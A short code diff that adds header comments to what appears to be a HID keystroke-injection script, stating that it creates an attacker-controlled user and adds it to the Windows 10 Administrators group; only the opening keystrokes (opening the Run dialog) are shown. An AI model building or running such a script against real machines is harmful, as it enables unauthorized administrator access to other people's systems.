@@ -1,3 +1,7 @@
+// Aashish Aryal
+// A HID script to create a new user for attacker and add it to the Administrators group in Windows 10
+// This script is to be run from attacker's machine on target machine
+
 layout("US")
 delay(2000)
 press("GUI r") // Open Run dialog
